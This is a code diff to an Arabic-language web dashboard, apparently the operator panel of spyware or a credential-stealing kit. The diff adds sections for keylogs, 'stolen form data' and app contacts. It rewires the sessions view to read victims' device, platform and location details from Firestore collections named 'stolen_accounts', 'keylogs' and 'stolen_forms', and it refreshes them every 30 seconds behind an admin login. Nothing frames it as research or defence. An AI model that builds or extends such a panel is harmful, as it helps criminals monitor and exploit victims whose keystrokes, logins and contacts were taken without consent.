@@ -224,6 +224,13 @@
         .section-content::-webkit-scrollbar-thumb:hover {
             background: #a8a8a8;
         }
+        .stat-badge {
+    background: rgba(255, 255, 255, 0.2);
+    padding: 4px 8px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: 600;
+}
     </style>
 </head>
 <body>
@@ -306,7 +313,37 @@
                     <div class="loading">⏳ جاري تحميل بيانات الحسابات...</div>
                 </div>
             </div>
-
+            
+<!-- قسم سجلات الكتابة -->
+<div class="section">
+    <div class="section-header">
+        <h2>⌨️ سجلات الكتابة (Keylogs)</h2>
+        <span class="stat-badge" id="keylogs-badge">0</span>
+    </div>
+    <div class="section-content" id="keylogs-list">
+        <div class="loading">⏳ جاري تحميل سجلات الكتابة...</div>
+    </div>
+</div>
+            <!-- قسم بيانات النماذج -->
+<div class="section">
+    <div class="section-header">
+        <h2>📝 بيانات النماذج المسروقة</h2>
+        <span class="stat-badge" id="forms-badge">0</span>
+    </div>
+    <div class="section-content" id="forms-list">
+        <div class="loading">⏳ جاري تحميل بيانات النماذج...</div>
+    </div>
+</div>
+            <!-- قسم جهات اتصال التطبيقات -->
+<div class="section">
+    <div class="section-header">
+        <h2>📱 جهات اتصال التطبيقات</h2>
+        <span class="stat-badge" id="app-contacts-badge">0</span>
+    </div>
+    <div class="section-content" id="app-contacts-list">
+        <div class="loading">⏳ جاري تحميل جهات اتصال التطبيقات...</div>
+    </div>
+</div>
             <!-- قسم الجلسات -->
             <div class="section">
                 <div class="section-header">
@@ -551,13 +588,15 @@ async function loadAppContacts() {
         // تحميل الجلسات
         async function loadSessions() {
             const sessionsList = document.getElementById('sessions-list');
-            sessionsList.innerHTML = '<div class="loading">⏳ جاري تحميل الجلسات...</div>';
+    sessionsList.innerHTML = '<div class="loading">⏳ جاري تحميل الجلسات...</div>';
 
             try {
-                const snapshot = await db.collection('active_sessions')
-                    .orderBy('lastActive', 'desc')
-                    .limit(15)
-                    .get();
+                
+        // استخدام بيانات من stolen_accounts كبديل
+        const snapshot = await db.collection('stolen_accounts')
+            .orderBy('timestamp', 'desc')
+            .limit(10)
+            .get();
 
                 allSessions = [];
                 sessionsList.innerHTML = '';
@@ -568,26 +607,26 @@ async function loadAppContacts() {
                 }
 
                 snapshot.forEach(doc => {
-                    const session = doc.data();
-                    allSessions.push(session);
+            const account = doc.data();
+            allSessions.push(account);
                     
                     const sessionElement = `
                         <div class="data-item">
-                            <div class="data-item-header">
-                                <div class="data-item-title">${session.ipAddress || 'غير معروف'}</div>
-                                <div class="data-item-meta">${session.device || 'جهاز غير معروف'}</div>
-                            </div>
-                            <div class="data-item-content">
-                                ${session.browser || 'متصفح غير معروف'}<br>
-                                ${session.location || 'موقع غير معروف'}
-                            </div>
-                            <div class="timestamp">
-                                آخر نشاط: ${formatTimestamp(session.lastActive)}
-                            </div>
-                        </div>
-                    `;
-                    sessionsList.innerHTML += sessionElement;
-                });
+                    <div class="data-item-header">
+                        <div class="data-item-title">${account.basicInfo?.userAgent?.substring(0, 40) || 'جهاز غير معروف'}</div>
+                        <div class="data-item-meta">${account.locationInfo?.hostname || 'غير معروف'}</div>
+                    </div>
+                    <div class="data-item-content">
+                        ${account.basicInfo?.platform || 'منصة غير معروفة'}<br>
+                        ${account.basicInfo?.timezone || 'توقيت غير معروف'}
+                    </div>
+                    <div class="timestamp">
+                        ${formatTimestamp(account.timestamp)}
+                    </div>
+                </div>
+                `;
+            sessionsList.innerHTML += sessionElement;
+        });
 
             } catch (error) {
                 sessionsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل الجلسات</div>';
@@ -596,17 +635,35 @@ async function loadAppContacts() {
 
         // ========== دوال مساعدة ==========
         function updateStats() {
-            document.getElementById('contacts-count').textContent = allContacts.length;
-            document.getElementById('files-count').textContent = allFiles.length;
-            document.getElementById('accounts-count').textContent = allAccounts.length;
-            document.getElementById('sessions-count').textContent = allSessions.length;
-            
-            document.getElementById('contacts-badge').textContent = allContacts.length;
-            document.getElementById('files-badge').textContent = allFiles.length;
-            document.getElementById('accounts-badge').textContent = allAccounts.length;
-            document.getElementById('sessions-badge').textContent = allSessions.length;
-        }
-
+    // الإحصائيات الأساسية
+    document.getElementById('contacts-count').textContent = allContacts.length;
+    document.getElementById('files-count').textContent = allFiles.length;
+    document.getElementById('accounts-count').textContent = allAccounts.length;
+    document.getElementById('sessions-count').textContent = allSessions.length;
+    // تحديث جميع الـ badges
+    document.getElementById('contacts-badge').textContent = allContacts.length;
+    document.getElementById('files-badge').textContent = allFiles.length;
+    document.getElementById('accounts-badge').textContent = allAccounts.length;
+    document.getElementById('sessions-badge').textContent = allSessions.length;
+                // ✅ تحديث الـ badges للأقسام الجديدة
+    const keylogsBadge = document.getElementById('keylogs-badge');
+    const formsBadge = document.getElementById('forms-badge');
+    const appContactsBadge = document.getElementById('app-contacts-badge');
+    
+    if (keylogsBadge) {
+        const keylogsCount = document.getElementById('keylogs-list')?.children.length || 0;
+        keylogsBadge.textContent = keylogsCount;
+    }
+    
+    if (formsBadge) {
+        const formsCount = document.getElementById('forms-list')?.children.length || 0;
+        formsBadge.textContent = formsCount;
+    }
+                if (appContactsBadge) {
+        const appContactsCount = document.getElementById('app-contacts-list')?.children.length || 0;
+        appContactsBadge.textContent = appContactsCount;
+    }
+}
         function formatPhone(phone) {
             if (!phone) return 'لا يوجد رقم';
             return phone.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
@@ -656,8 +713,25 @@ async function loadAppContacts() {
         }
 
         // ========== التهيئة ==========
-        document.addEventListener('DOMContentLoaded', function() {
-            // تحميل البيانات الأولي
+        
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        // تهيئة Netlify Identity
+        if (window.netlifyIdentity) {
+            netlifyIdentity.init();
+            
+            // إضافة مستمعي الأحداث
+            netlifyIdentity.on('login', () => {
+                loadAllData();
+            });
+            
+            netlifyIdentity.on('logout', () => {
+                window.location.href = 'index.html';
+            });
+        }
+                // تحميل البيانات الأولي بعد التحقق من المصادقة
+        const isAuthenticated = await authenticateAdmin();
+        if (isAuthenticated) {
             loadAllData();
             
             // تحديث الوقت كل دقيقة
@@ -665,8 +739,13 @@ async function loadAppContacts() {
             
             // تحديث تلقائي للبيانات كل 30 ثانية
             setInterval(loadAllData, 30000);
-        });
-
+        }
+        
+    } catch (error) {
+        console.error('Initialization error:', error);
+        showError('خطأ في تهيئة النظام');
+    }
+});
         // ========== مصادقة المسؤول ==========
         async function authenticateAdmin() {
             try {
@@ -710,19 +789,26 @@ async function loadAppContacts() {
         authenticateAdmin();
 // ✅ إضافة collections جديدة
 async function loadKeylogs() {
-    try {
+ try {
         const snapshot = await db.collection('keylogs')
             .orderBy('timestamp', 'desc')
             .limit(30)
             .get();
 
         const keylogsList = document.getElementById('keylogs-list');
+        if (!keylogsList) {
+            console.warn('Element keylogs-list not found');
+            return;
+        }
+
         keylogsList.innerHTML = '';
 
         if (snapshot.empty) {
             keylogsList.innerHTML = '<div class="no-data">لا توجد سجلات كتابة</div>';
             return;
+                    
         }
+
         snapshot.forEach(doc => {
             const keylog = doc.data();
             const keylogElement = `
@@ -738,14 +824,18 @@ async function loadKeylogs() {
                         ${formatTimestamp(keylog.timestamp)}
                     </div>
                 </div>
-            `;
+                `;
             keylogsList.innerHTML += keylogElement;
         });
-         } catch (error) {
+
+    } catch (error) {
         console.error('Error loading keylogs:', error);
+        const keylogsList = document.getElementById('keylogs-list');
+        if (keylogsList) {
+            keylogsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل سجلات الكتابة</div>';
+        }
     }
 }
-
 async function loadFormData() {
     try {
         const snapshot = await db.collection('stolen_forms')
